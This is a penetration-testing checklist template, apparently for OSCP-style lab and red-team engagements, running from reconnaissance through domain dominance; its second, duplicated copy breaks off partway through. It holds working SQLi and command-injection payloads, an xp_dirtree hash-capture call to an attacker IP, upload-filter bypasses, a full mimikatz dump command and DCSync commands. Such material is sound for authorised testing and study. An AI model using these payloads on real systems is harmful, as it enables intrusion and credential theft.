# Parking Lot
```
# Annotate sensitive files here that we do not have access to, in case we GAIN access later
```

```
Park creds/key/domain info here:
```
# Reconnaissance
#### TCP
Initial Scan
`sudo nmap <ip> -sC -sT -sV -p<ports> -oN ~/path/<standalone>/<standalone>_TCP_ALL`


Deep Scan
`sudo nmap <ip> -A -p<ports> -oN ~/path/<standalone>/<standalone>_TCP_ALL`

#### UDP
Initial Scan
`sudo nmap <ip> -sU --top-ports=100 -oN ~/path/<standalone>/<standalone>_UDP`


Deep Scan
`sudo nmap <ip> -sU -A -p<ports> -oN ~/path/<standalone>/<standalone>_UDP_ALL`

#### Autorecon
`sudo env "PATH=$PATH" autorecon <ip_address>

#### Nikto
`nikto -host <ip_address>   # or /etc/hosts hostname`



# Footprinting
```
1. Unknown Port? Search for it DIRECTLY on HackTricks
2. google '<service> exploits' AND '<service> RCE'
3. Any ports that do not reveal much, redo scan with -A and specify port
4. Redo scan if host added to /etc/hosts
5. Public exploit not working? Verify, then search for others on github
```

place ports and findings here...
#### 80 http

##### 1. Service Overview & Recon
- [ ] **Nmap Findings:**
	    
- [ ] **Nikto Scan:**
	    
- [ ] **Wappalyzer:**
    - [ ] Identify Tech Stack / Versions
	    
    - [ ] `searchsploit` / #`Google for "<Version> exploits" or "<Version> RCE"`
	    
##### 2. Manual Enumeration
- [ ] **Visual Inspection:** Visit website and poke around.
	    
- [ ] **Source Code Review:**
    
    - [ ] Inspect Page Source (comments, hidden inputs)
	        
    - [ ] `curl -s <target> | html2markdown` (Check for stripped comments)
			
- [ ] **Common Files & Directories:**
    
    - [ ] `/robots.txt`
	        
    - [ ] `/.htaccess` (Also via LFI/File Upload)
	        
    - [ ] `/.env`
	        
    - [ ] `/.git` (Use `git-dumper` if found)
	        
    - [ ] `/api/` (Try generic endpoints)
	        
- [ ] **Weird/Duplicate Pages:**
    
    - [ ] Check for `/old`, `/backup`, `/dev` versions of pages.
	        
    - [ ] Compare page sources of similar pages.
	        
- [ ] **Misc:**
	
	- [ ] Inspect Element for any masked characters that cover user passwords. The password MIGHT be in cleartext.
		

##### 3. Authentication & Portals

- [ ] **Default Credentials:**
    
    - [ ] `admin:admin` / `Admin:Admin`
	        
    - [ ] Check vendor documentation for default creds.
	        
- [ ] **Bypass Techniques:**
    
    - [ ] SQLi Login Bypass (Try `' OR 1=1 --`)
	        
    - [ ] Forgot Password Abuse
	        
- [ ] **Brute Force (Hydra):**
    
    - [ ] Wordlist: `rockyou.txt`
		    
    - [ ] Wordlist: local Kali repo of service (if it exists) 
		    
    - [ ] Wordlist: `cewl` (Custom wordlist from site content)
	        
    - [ ] Check for user/credential reuse from other services
	        

##### 4. Fuzzing & Discovery

- [ ] **Directory Brute-forcing ([[Feroxbuster]]):**
    
    - [ ] Standard Scan
	        
    - [ ] Extension Scan (`.sh`, `.php`, `.txt`, `.bak`) `# .sh = shellshock!`
	        
    - [ ] **Re-scan** manually identified directories.
		    
    - [ ] **Manual Directory Guessing (Last Resort):** Try directory names based on enumerated data (e.g., if the hostname or target is `sitebox`, try `http://<ip>/sitebox/`).
			
- [ ] **[[Domain Fuzzing]]: Subdomains and VHOSTs** 
    
    - [ ] `ffuf` / `wfuzz` (Check VHOSTs)
	        
    - [ ] _Reminder: Add subdomains to `/etc/hosts`_
	        
- [ ] **[[Parameter Fuzzing]]:**
    
    - [ ] Fuzz GET/POST parameters for hidden inputs.
			
    - [ ] Value Fuzzing
	        

##### 5. Vulnerability Specific Checks

###### SQL Injection ([[SQLi]]) - [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)

- [ ] **1. Discovery & Validation**
    
    - [ ] Test EVERY input form (POST requests) and URL parameter (`?id=1`).
        
    - [ ] Inject single quote (`'`) to observe application behavior.
        
    - [ ] **Analyze Response:** - Look for verbose SQL syntax errors.
        
        - [ ] _Note: If a payload like `' or 1=1 in (select @@version) -- //` throws an error, but `'select @@version; -- //` returns "invalid credentials" or no output, the query may still be executing despite the lack of reflection._
            
- [ ] **2. Authentication Bypass (Login Forms)**
    
    - [ ] Test standard OR operators (Requires a valid username usually):
        
        - [ ] `<user>' or '1'='1`
            
    - [ ] Test comment truncation:
        
        - [ ] `<user>'--`
            
        - [ ] `' OR 1=1 -- //`
            
- [ ] **3. In-Band Enumeration**
    
    - [ ] **Error-Based Extraction:**
        
        - [ ] Version: `' or 1=1 in (select @@version) -- //`
            
        - [ ] Read columns: `' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //`
            
    - [ ] **Union-Based Extraction:** (Requires matching column count and compatible data types)
        
        - [ ] _Determine Column Count:_ - [ ] `' ORDER BY 1-- //` (Increment until error)
            
            - [ ] `' UNION select 1,2,3,4 -- //` (Add/subtract until successful output)
                
        - [ ] _Enumerate Environment:_ - [ ] `%' UNION SELECT database(), user(), @@version, null, null -- //`
            
        - [ ] _Enumerate Schema:_ - [ ] `' UNION SELECT null, table_name, column_name, table_schema, null FROM information_schema.columns WHERE table_schema=database() -- //`
            
- [ ] **4. Blind SQLi** _(Consider scripting or SQLMap if these trigger)_
    
    - [ ] **Boolean-Based:** Observe if page content changes based on true/false statements.
        
        - [ ] `?user=admin' AND 1=1 -- //` (True)
            
        - [ ] `?user=admin' AND 1=2 -- //` (False)
            
    - [ ] **Time-Based:** Observe if the server hangs before responding.
        
        - [ ] `?user=admin' AND IF (1=1, sleep(3),'false') -- //`
            
- [ ] **5. MSSQL Specific Attacks (Hash Theft)**
    
    - [ ] Setup Responder on attacker machine: `sudo responder -I tun0`
        
    - [ ] Inject `xp_dirtree` payload to force an SMB authentication attempt to your machine:
        
        - [ ] `; EXEC master ..xp_dirtree '\\<attack_ip>\test'; --`
            
    - [ ] Capture Net-NTLMv2 hash and crack.
        
- [ ] **6. Automated (SQLMap)**
    
    - [ ] **Discovery & Crawling:**
        
        - [ ] `sqlmap -u <url> --forms --crawl=2`
            
    - [ ] **Targeted Parameter:**
        
        - [ ] `sqlmap -u http://<ip>/category?id=1 -p <parameter>`
            
    - [ ] **Data Extraction:**
        
        - [ ] Enumerate DBs: `sqlmap -u <url> -p <parameter> --dbs --batch`
            
        - [ ] Dump specific DB: `sqlmap -u <url> -p <parameter> -D <database> --dump`
            
    - [ ] **RCE / OS Shell:**
        
        - [ ] Save Burp POST request to `post.txt`.
            
        - [ ] `sqlmap -r post.txt -p <parameter> --os-shell --web-root "/var/www/html/tmp"`

###### File Inclusion (LFI/RFI)... 

- [ ] **Identification:**
    
    - [ ] URL Parameters: `?view=`, `?page=`, `?include=`
        
    - [ ] Test: `../../../../etc/passwd`
		
	- [ ] Test basic encoding like `....//....//....//....//etc/passwd`
		
- [ ] **Enumeration:**
    
    - [ ] Manual Traversal (config files, /etc/passwd, ssh keys, etc...)
	    
    - [ ] Read .php files (see [[PHP Wrappers]] File Disclosure)
	    
    - [ ] Automated Fuzzing (see [[Methodology/Web App/File Inclusion/Local File Inclusion (LFI)|Local File Inclusion (LFI)]])
        
- [ ] **RCE Escalation:**
    
    - [ ] [[Remote File Inclusion (RFI)]]
        
    - [ ] [[LFI Log Poisoning]] (Apache/Auth logs)
        
    - [ ] [[PHP Wrappers]] (`expect://`, `php://input`)
        
    - [ ] [[LFI and File Uploads]] (Upload shell + include via LFI)
	    
###### File Upload Attacks ([[File Upload Attacks]])

- [ ] **1. Initial Upload & Client-Side Bypass**
    
    - [ ] Upload a raw shell (`shell.php`) to test baseline validation.
	        
    - [ ] Inspect page source (CTRL+SHIFT+C) and delete client-side JS validation functions (e.g., `onchange="checkFile(this)"`).
		    
	- [ ] Test for SSRF by uploading a file a user will click that hits Responder. Capture hash.
			

- [ ] **2. Extension Filtering (Blacklists & Whitelists)**
    
    - [ ] **Fuzz Extensions:** Use Burp Intruder to test alternative extensions (`.php5`, `.phtml`, `.shtml`).
        
    - [ ] **Double Extensions:** Test `shell.jpg.php` (whitelist bypass) and `shell.php.jpg` (server misconfig bypass).
        
    - [ ] **Character Injection:** Fuzz injected characters like null bytes or spaces (`shell.php%00.jpg`, `shell.aspx:.jpg`).
        
- [ ] **3. Content & Type Validation (MIME & Magic Bytes)**
    
    - [ ] **Content-Type:** Intercept the upload request and change the header to `image/jpeg` or `image/png`.
        
    - [ ] **Magic Bytes:** Prepend legitimate image bytes (`GIF89a`) directly before the PHP payload.
        
    - [ ] _Note: Combine both Content-Type and Magic Bytes spoofing for best results._
        
- [ ] **4. Alternative Upload Vectors**
    
    - [ ] **Stored XSS:** Inject payloads into image metadata (`exiftool -Comment='"><script>alert(1)</script>' file.jpg`) or upload malicious `.svg` files.
        
    - [ ] **XXE:** Upload an `.svg` containing XML external entities (`<!ENTITY xxe SYSTEM "file:///etc/passwd">`).
        
    - [ ] **Command Injection:** Inject bash commands directly into the filename (`file$(whoami).jpg`, `file.jpg||whoami`) if the application reflects it.
###### XXE Attacks ([[XXE Attacks]])

- [ ] **Discovery:** Verify XML parsing.
    
- [ ] **In-Band Exploitation:**
    
    - [ ] Local File Disclosure (`file:///etc/passwd`)
        
    - [ ] Source Code Disclosure (`php://filter`)
        
    - [ ] RCE (`expect://` - rare)
        
- [ ] **Blind / OOB Exploitation:**
    
    - [ ] Error-Based Exfiltration
        
    - [ ] Blind OOB (HTTP interaction)
        
    - [ ] CDATA Wrappers (Special characters)
        
- [ ] **Automated:**
    
    - [ ] XXEinjector
        
###### Insecure Direct Object References ([[IDOR]])

- [ ] **1. Identification & Parameter Testing**
    
    - [ ] Fuzz predictable URL parameters (e.g., `?uid=1` to `?uid=2`, `?filename=file_1.pdf` to `file_2.pdf`).
        
    - [ ] Inspect HTTP requests (GET/POST) and JSON bodies for hidden ID or UID fields.
        
    - [ ] Review front-end source code (specifically AJAX calls) to see how the application builds data requests and routes.
        
- [ ] **2. Bypassing Encoded References**
    
    - [ ] If parameters look like hashes, analyze the front-end JavaScript to identify the encoding/hashing logic (e.g., `CryptoJS.MD5(btoa(uid))`).
        
    - [ ] Replicate the client-side hashing logic locally (via bash or a script) to generate valid payload hashes for other UIDs.
        
- [ ] **3. Insecure API Exploitation**
    
    - [ ] **Information Disclosure:** Change IDs in `GET` requests to API endpoints (e.g., `/api.php/profile/2`) to leak target details like UUIDs, roles, or emails.
        
    - [ ] **Data Modification:** Send `PUT` or `POST` requests modifying the UID/UUID to alter another user's profile.
        
    - [ ] **Privilege Escalation:** Attempt to change role attributes (e.g., `"role": "web_admin"`) or cookies during profile update requests.
        
- [ ] **4. Mass Enumeration & Exfiltration**
    
    - [ ] Use Burp Intruder / ZAP Fuzzer to iterate through sequential IDs.
        
    - [ ] For heavy extraction, write a bash script using `curl`, `grep` (Regex), and `wget` to loop over parameters and automatically download exposed documents.

###### Command Injection ([[Command Injection]])

- [ ] **1. Operator Injection & Testing**
    
    - [ ] Test appending commands using standard shell operators:
        
        - [ ] `;` (Semicolon - Execute sequentially)
            
        - [ ] `&&` (AND - Execute if first succeeds)
            
        - [ ] `||` (OR - Execute if first fails)
            
        - [ ] `|` (Pipe - Pass output to next command)
            
        - [ ] `$()` or `` ` `` (Sub-shell execution - Linux only)
        
- [ ] **2. Space Filter Evasion**
    
    - [ ] **Tabs / Newlines:** Replace spaces with URL-encoded tabs (`%09`) or newlines (`%0a`).
        
    - [ ] **Environment Variables:** Use the Internal Field Separator (`$IFS`) in Linux: `127.0.0.1%0a${IFS}whoami`.
        
    - [ ] **Brace Expansion:** Execute without spaces using commas: `127.0.0.1%0a{ls,-la}`.
        
- [ ] **3. Blacklisted Character Evasion (`/`, `\`, `;`)**
    
    - [ ] **Linux Path Slicing:** Extract allowed characters from environment variables:
        
        - [ ] `/` bypass: `${PATH:0:1}`
            
        - [ ] `;` bypass: `${LS_COLORS:10:1}`
            
    - [ ] **Windows Path Slicing:** Extract `\` from the homepath: `%HOMEPATH:~6,-11%` (cmd) or `$env:HOMEPATH[0]` (powershell).
        
- [ ] **4. Blacklisted Command Evasion**
    
    - [ ] **Quote Insertion:** Break up the command string: `w'h'o'am'i` or `w"h"o"am"i`.
        
    - [ ] **Positional Parameters (Linux):** Insert `$@` or `\` into the command: `who$@ami` or `w\ho\am\i`.
        
    - [ ] **Caret Insertion (Windows):** Insert `^` into the command: `who^ami`.
        
    - [ ] **Command Reversal:** Reverse the string (e.g., `imaohw`) and execute the reversal: `$(rev<<<'imaohw')`.
        
    - [ ] **Base64 Encoding:** Encode the command and decode it during execution: `bash<<<$(base64 -d<<<d2hvYW1p)`.
        
- [ ] **5. Automated Obfuscation**
    
    - [ ] **Linux:** Use Bashfuscator (`./bashfuscator -c '<command>'`) to generate heavily mangled payloads.
        
    - [ ] **Windows:** Use Invoke-DOSfuscation to interactively generate obfuscated cmd/powershell payloads.

###### HTTP Verb Tampering ([[HTTP Verb Tampering]])

- [ ] Try `PUT`, `DELETE`, `HEAD` on restricted resources.
	

##### 6. Post-Exploitation / Review

- [ ] **Config Files:** Look for DB strings, API keys.
    
- [ ] **Hashes:**
    
    - [ ] Identify format
        
    - [ ] Crack (`john`, `hashcat`, `crackstation`)
        
- [ ] **Automated Scanners:**
    
    - [ ] `wpscan` (If WordPress)
        
    - [ ] `nikto` (Re-run with auth if possible)


#### Active Directory
See [[AD Attacks]]
Blind User Enumeration `# Kerbrute, RID cycling, etc...`
	-

Check for users with Do not require kerberos pre-authentication ([[AS-REP Roasting]] -no-pass)
	-

Collect Sharphound data for bloodhound
	-

Enumerate Bloodhound `# Parse CAREFULLY`
	-

[[AS-REP Roasting]] Attack
	-

Kerberoast Attack
	-

Targeted Kerberoast Attack
	-

Timeroast
	-

ADCS 
	-

ACLs
	-

Silver Ticket
	-

PtH
	-

PtT
	-

PtC
	-

[[AD Recycle Bin]]
	-

Domain Dominance [[14 Domain Dominance]]
	DCSync
		-
	Ticket Forgery
		-
	DPAPI Backup Keys
		-

Domain Trusts [[15 Forest & Domain Trusts]]
	Enumerate Trusts
		-
	Trust Abuse
		-
# Initial Access
```
Need to compile something? Ideally we are able to compile on target...
	yes: great
	no: search for precompiled online OR compile locally 

Public exploit not working? Verify, then search for others on github
```

Query Defender Status
	-

Query Applocker 
	-
	Is Applocker present?
		-
	Enumerate
		-

# Persistence
```
Establish and document elevated persistence method here.

In general, I would say: 

dns -> long-haul persistence 
http/s -> post-ex 
smb -> lateral movement 
tcp-local -> priv esc
```

Establish Persistence 
	-

Pass session for faster channel/post-ex commands (C2)
	-

SSH Keygen
	-

# Host-Recon & Post-Exploitation
#### C2 Specific:
Session Passing `slow -> faster channel `
	-

Keylogger
	-

Check processes
	-

Clipboard
	-

Screenshots
	-

VNC (Remote desktop control)
	-

Import tooling `powershell-import`
	-
#### Windows:
hostname
	-

tree /f .
	-

whoami
	-

whoami /priv
	-

whoami /groups
	-

set
	-

`dir \Users
	-

local users `# net user`
	-
	specific users `# net user <user>`    `# do for EVERY user, check comments, etc...`
		-

domain users `# net user /domain
	-
	specific users
		-

net localgroup
	-

net group
	-

systeminfo
	-

network information
	`ipconfig /all
		-
	`route print
		-
	`netstat -ano     # internally exposed ports? chisel! webapps? conf files, LFI + rev shell, etc..` 
		-

installed apps
	32 bit `--- # Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`
		-
	64 bit `--- # Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`
		-
	`reg query` any interesting software
		-

Running Apps `# Get-Process`
	-

User History `Get-History`
	-
	PSReadline `# (Get-PSReadlineOption).HistorySavePath`
		-
	All Users (see [[Windows History]])
		-

switch user `# also consider runas /user:<domain>\<user> cmd.exe`
	`user:user` cred combinations
		-
	credential reuse
		-
	ssh reuse
		-

Path Interception
	PATH Env variable abuse
		-
	Search Order Hijacking 
		-
	Unquoted Service Paths `# Remove 'auto' filters if we can start/stop services`
		CMD `# wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """`
			-
		PowerShell `# Get-CimInstance -ClassName Win32_Service | Where-Object { $_.PathName -notlike '"*' and $_.StartMode -eq 'Auto' -and $_.PathName -like '* *' -and $_.PathName -notlike 'C:\Windows\*'} | Select-Object Name, PathName`
			-
		Manually Check (Look at Installed Apps and probe)
			-

Weak Service Permissions 
	Enumerate services `# Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}`
		or... `sc_enum`
		-
	Check file service perms `# icacls`
		-
	Check service registry perms (FullControl) `# Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\Services\BadWindowsService` 
		-

DLL Hijacking `#procmon - Check for missing DLLs OR place evil dll higher in hierarchy`
	-

Software Vulnerabilities
	Unsafe Deserialization
		-

User Account Control (UAC)
	CMSTPLUA UAC Bypass
		-

ChangeConfig Service Right Abuse (See [[Services]])
	`Import-Module .\Get-ServiceAcl.ps1`
	`"<Service>" | Get-ServiceAcl | select -ExpandProperty Access`
		-

Scheduled Tasks  `# schtasks  |  schtasks /query /fo LIST /v  |  Get-ScheduledTask
	-
	Hunt for specific users -- `Get-ScheduledTask | Where-Object -Property Author -match <user> | fl *`
		-
	`Get-ScheduledTask | Select-Object Author,Trigger,Action,TaskName,TaskPath,Source,Principal | fl`
		-
	TaskScheduler -- `#GUI - look at author, trigger, action, etc...`
		-

Medium Integrity credential access
	Cred from web browsers `.\SharpChrome.exe logins`
		-
	Windows Cred Manager
		Enumerate for creds `.\Seatbelt.exe WindowsVault`
			-
		Decrypt creds `.\SharpDPAPI.exe credentials /rpc`
			-

Manual Enumeration: `# dir /a /q [/R]    # -r: Alternate data streams`
	`\directory\we\spawn\in    # and adjacents`
		-
	`\Users\<user>\AppData\stuff
		-
	`\Users\<user>\<all_files>
		-
	`\Users\<users>
		-
	`\
		-
	`\xampp`
		-

Search for specific files `# Use Get-ChildItem premade queries from master checklist` See [[Looting]]
	Config Files
		-
	kdbx files
		-
	.txt, .ini files
		-
	home dir recursive search for creds/databases
		-
	zip files
		-
	SAM/SYSTEM/SECURITY
		-
	Alternate Data Streams `# NOTE: this is really CTFy... dir /R`
		-

Automations
.\winPEASany.exe `# also winPEAS.ps1... PARSE CAREFULLY... AlwaysInstallElevated...
	-

.\LaZagne.exe all
	-

.\jaws-enum.ps1
	-

Import-Module .\PowerUp.ps1
	`Invoke-AllChecks`
		-
	`Get-ModifiableServiceFile
		-
	`Get-UnquotedService`
		-

windows exploit suggester
	-

[[AD Recycle Bin]]
	-
#### Linux:
hostname
	-

whoami
	-

id
	-

sudo -V
	-

sudo -l
	-

env
	-

history
	-

/etc/passwd
	users
		-
	file perms
		-

/etc/shadow
	-

/etc/sudoers
	-

switch user `# su -l <user>`
	`user:user` cred combinations
		-
	credential reuse
		-
	ssh reuse
		-

os/kernel version info `# is gcc present?`
	-
	`searchsploit #.#.#-###`
		-
	google
		-

system processes `# ps aux`
	-

interfaces `# ip a`
	-

routes `# routel`
	-

ports `# internally exposed ports? chisel! webapps? conf files, LFI + rev shell, etc..
	-

multiple webservers `# check /var/www and check /etc/apache2/sites-enabled or /etc/nginx/sites-enabled`
	NOTE: vhost could share same port but only be accessible from localhost `# ie: port-forward`
	-

scheduled tasks `# pspy64 automated, crontab -l, cat /var/log/syslog | grep -i cron`
	-

installed packages `# dpkg -l`
	-

world writable directories `# find / -writable -type d 2>/dev/null`
	-

mounted drives `# cat /etc/fstab, lsblk`
	-

list loaded drivers `# lsmod`
	-

SUID files `# find / -perm -u=s -type f 2>/dev/null`
	-

Password Reuse `# identified passes/strings go here`
	-
	redo `sudo -l` if password was required
		-
	local db auth
		-
	switch users `# su -l <user>   AND   ssh <user>@<ip>`
		-
	misc
		-

Manual Enum:  `# consider ls -laiRtu

`/directory/we/spawn/in`    `# and adjacent ones`
	-
`/home/<user>
	-
`/home
	-
`/`
	-
`/opt`
	-
`/var`      `# www/, mail/, etc... cred hunting galore`
	-
anything else of interest
	-


Config files and information within:
	-

.db search `# find / -name *.db 2>/dev/null      ## also *db*, *database*, etc...`
	-

.sql search `# find / -name *.sql 2>/dev/null      ## also *sql*, etc...
	-

.conf search `# find / -name *.conf 2>/dev/null      ## also *conf*, *cfg*, etc...`
	-

Fire `./linpeas.sh > /tmp/linpeas.txt`
	manually parse
		-
	`grep -i pass
		-
#### Automated:
```
peas

LaZagne.exe all

SharpUp.exe audit

```



# Privilege Escalation
```
Document PrivEsc Attempts in this section
```
#### Attempt 1:
# Elevated Persistence
```
Establish and document elevated persistence method here.
OPSEC? - WMI Event Subscription
```

# Credential Access

```
OPSEC? DON'T DUMP LSASS BRO... otherwise mimikatz ;)
```

Medium Integrity cred access
	Cred from web browsers
		-
	Windows Cred Manager
		-

High Integrity cred access
	Kerberos `# Triage targets first for OPSEC`
		Targeted asreproast
			-
		Targeted kerberoast
			-
		Dump tickets from memory (does not touch LSASS :))
			-
		Renew TGTs if needed
			-

OS Credential Dumping 
```powershell
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "sekurlsa::credman" "sekurlsa::ekeys" "lsadump::sam" "lsadump::lsa" "lsadump::cache" "lsadump::secrets" "exit"
```

LaZagne.exe
```powershell
.\LaZagne.exe all
```

# User Impersonation
```powershell
# NOTE: use token-store whenever we impersonate
token-store steal [PID]
token-store use [ID]
```

su
	

High-Integrity
	Token Impersonation 
		-
	Process Injection
		-

PtH
	-

PtT
	-

PtC
	-

RunasCs.exe
	-
# Discovery
#### BloodHound
SharpHound `BAD OPSEC`
	-

BOFHound Collection
	-

Restricted Groups
	-

WMI Filters
	-
#### LDAP Queries
###### Domain Information
```
```
###### Kerberos
Unconstrained Delegation
	Identification
		-
	Standard
		-
	S4U2Self Computer Takeover
		-

Constrained Delegation
	Identification
		-
	Standard
		-
	Service Name Substitution
		-

Resource Based Constrained Delegation
	-

Silver Ticket (to impersonate rather than persistence) `# NOT GOOD OPSEC...`
	-
###### MSSQL
MSSQL Server Identification
	if present, proceed to [MSSQL](#MSSQL)

# Lateral Movement

WinRM
	-

SCShell (PSExec is BAD)
	-

MavInject
	-

#### C2
Reference [[10 Lateral Movement]]
#### Without C2
winrm, psexec, etc...

# Pivoting

Enumerate interfaces for Internal networks
	-

SOCKS
	-

Reverse Port Forward
	-

Ligolo-ng
	-
# MSSQL

Present?
	-

Code Exec
	SQL CLR (best opsec)
		-
	OLE Automation
		-
	xp_cmdshell
		-

Linked Servers?
	-

Priv Esc
	-

# Domain Dominance

DCSync
```powershell
# impersonate a domain admin
beacon> make_token [DOMAIN]\[user] [password]

# dc sync -- capture domain krbtgt hash
beacon> dcsync [domain.com] [DOMAIN]\krbtgt

# dc sync -- capture computer account
beacon> dcsync [domain.com] [DOMAIN]\[hostname]$
```

Ticket Forgery for Persistence
	Silver Ticket
		-
	Golden Ticket
		-
	Diamond Ticket `BEST OPSEC`
		-

DPAPI Backup Keys
	-

# Forest and Domain Trusts

Enumerate Trust Accounts
```powershell
ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName
	# TrustDirection = 1 -> proceed to One-Way Inbound Trusts
	# TrustDirection = 2 -> proceed to One-Way Outbound Trusts
	# TrustDirection = 3 -> proceed to Parent-Child Tickets
```

Parent Child Tickets
	-

One-Way Inbound Trusts
	-

One-Way Outbound Trusts
	-

# Lessons Learned
```
Annotate any lessons learned from this engagement here
```
# Duplicate Checklist
In case I need an empty one :)
## Parking Lot
```
# Annotate sensitive files here that we do not have access to, in case we GAIN access later
```

```
Park creds/key/domain info here:
```
## Reconnaissance
#### TCP
Initial Scan
`sudo nmap <ip> -sC -sT -sV -p<ports> -oN ~/path/<standalone>/<standalone>_TCP_ALL`


Deep Scan
`sudo nmap <ip> -A -p<ports> -oN ~/path/<standalone>/<standalone>_TCP_ALL`

#### UDP
Initial Scan
`sudo nmap <ip> -sU --top-ports=100 -oN ~/path/<standalone>/<standalone>_UDP`


Deep Scan
`sudo nmap <ip> -sU -A -p<ports> -oN ~/path/<standalone>/<standalone>_UDP_ALL`

#### Autorecon
`sudo env "PATH=$PATH" autorecon <ip_address>

#### Nikto
`nikto -host <ip_address>   # or /etc/hosts hostname`



## Footprinting
```
1. Unknown Port? Search for it DIRECTLY on HackTricks
2. google '<service> exploits' AND '<service> RCE'
3. Any ports that do not reveal much, redo scan with -A and specify port
4. Redo scan if host added to /etc/hosts
5. Public exploit not working? Verify, then search for others on github
```

place ports and findings here...
#### 80 http
```
# Notes
```

nmap findings
	

nikto
	-

Visit website
	

Wappalyzer
	versions (including name of site)
		-
	searchsploit
		-
	`google "<version> exploits", "<version> rce", etc
		-

Manual Enumeration
	poke around
	-

Page Source
	Inspect page source
		-
	html2markdown -- `curl -s <target> | html2markdown`
		-

login portal
	default creds
		admin:admin
		Admin:Admin
		source config documentation
			-
	sqli `# try ' and also auth bypass`
		-
	forgot password abuse
		-
	check KALI local repo
		-
	hydra brute force ([[Web App Bruteforcing]])
		rockyou.txt
			-
		`cewl` wordlist
			-
		other
			-
	user/cred reuse
		-


**Some Common pages to try**
/robots.txt
	-

/.htaccess `# ALSO via file upload`
	-

/.env
	-

/.git
	-

/api/
	also try /api
	-


[[SQLi]] -- [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md) `# For reference`
	Manual Findings
		-
	SQLMap `# always try if stuck...`
		-


**File Inclusion**
[[Methodology/Web App/File Inclusion/Local File Inclusion (LFI)|Local File Inclusion (LFI)]] Identification  -- `# /index.php?view=<file_name>`
	yes or no?

LFI Enumeration -- Manual + Fuzzing
	-

**File Inclusion RCEs**
[[Methodology/Web App/File Inclusion/RCE/Remote File Inclusion (RFI)|Remote File Inclusion (RFI)]]
	-
[[LFI Log Poisoning]]
	-
[[PHP Wrappers]] -- Also config file disclosure
	-
[[LFI and File Uploads]]
	-



file upload -- see [[File Upload Attacks]]
	-

Command injection
	-

HTTP Verb Tampering
	-

IDOR
	-

XXE Injection `# not in scope for OSCP`
	-

Read php files -- see [[PHP Wrappers]] `# php://filter...`
	`index.php?page=php://filter/resource=<file>
		-
	`index.php?file=php://filter/convert.base64-encode/resource=<file>
		-

Hacktricks
	-

Automated scanning
	wpscan
	git-dumper
	etc...

Weird/out of place pictures
	-

Duplicate webpages `# ie: /old, compare page sources`
	-

Exposed Config files
	-

Found hashes? `# crackstation, john, hashcat...`
	-

Enumerate webpages
[[Feroxbuster]] + Extension scan `# sh files? shellshock`
	-

[[Feroxbuster]] Re-scan MANUALLY identified directories
	-

[[Domain Fuzzing]] `# 2 wordlists -- Don't forget to add subdomains to /etc/hosts -- ffuf AND wfuzz
	-

[[Parameter Fuzzing]]
	-

Check github documentation for interesting files
	if you get directory redirects from directories found from ferox, try accessing files within anyway by referencing the github documentation of the webapp

Guess directories (last resort)
	Try names we have enumerated
	ie: if hostname = `<name>`, then try `http://<ip>/<name>`



#### Active Directory
See [[AD Attacks]]
Blind User Enumeration `# Kerbrute, RID cycling, etc...`
	-

Check for users with Do not require kerberos pre-authentication ([[AS-REP Roasting]] -no-pass)
	-

Collect Sharphound data for bloodhound
	-

Enumerate Bloodhound `# Parse CAREFULLY`
	-

[[AS-REP Roasting]] Attack
	-

Kerberoast Attack
	-

Targeted Kerberoast Attack
	-

Timeroast
	-

ADCS 
	-

ACLs
	-

Silver Ticket
	-

PtH
	-

PtT
	-

PtC
	-

Domain Dominance [[14 Domain Dominance]]
	DCSync
		-
	Ticket Forgery
		-
	DPAPI Backup Keys
		-

Domain Trusts [[15 Forest & Domain Trusts]]
	Enumerate Trusts
		-
	Trust Abuse
		-
## Initial Access
```
Need to compile something? Ideally we are able to compile on target...
	yes: great
	no: search for precompiled online OR compile locally 

Public exploit not working? Verify, then search for others on github
```

Query Defender Status
	-

Query Applocker 
	-
	Is Applocker present?
		-
	Enumerate
		-

## Persistence
```
Establish and document elevated persistence method here.

In general, I would say: 

dns -> long-haul persistence 
http/s -> post-ex 
smb -> lateral movement 
tcp-local -> priv esc
```

Establish Persistence 
	-

Pass session for faster channel/post-ex commands (C2)
	-

SSH Keygen
	-

## Host-Recon & Post-Exploitation
#### C2 Specific:
Session Passing `slow -> faster channel `
	-

Keylogger
	-

Check processes
	-

Clipboard
	-

Screenshots
	-

VNC (Remote desktop control)
	-

Import tooling `powershell import`
	-
#### Windows:
hostname
	-

whoami
	-

whoami /priv
	-

whoami /groups
	-

set
	-

`dir \Users
	-

local users `# net user`
	-
	specific users `# net user <user>`    `# do for EVERY user, check comments, etc...`
		-

domain users `# net user /domain
	-
	specific users
		-

net localgroup
	-

net group
	-

systeminfo
	-

network information
	`ipconfig /all
		-
	`route print
		-
	`netstat -ano     # internally exposed ports? chisel! webapps? conf files, LFI + rev shell, etc..` 
		-

installed apps
	32 bit `--- # Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`
		-
	64 bit `--- # Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`
		-
	`reg query` any interesting software
		-

Running Apps `# Get-Process`
	-

User History `Get-History`
	-
	PSReadline `# (Get-PSReadlineOption).HistorySavePath`
		-
	All Users (see [[Windows History]])
		-

switch user `# also consider runas /user:<domain>\<user> cmd.exe`
	`user:user` cred combinations
		-
	credential reuse
		-
	ssh reuse
		-

Path Interception
	PATH Env variable abuse
		-
	Search Order Hijacking 
		-
	Unquoted Service Paths `# Remove 'auto' filters if we can start/stop services`
		CMD `# wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """`
			-
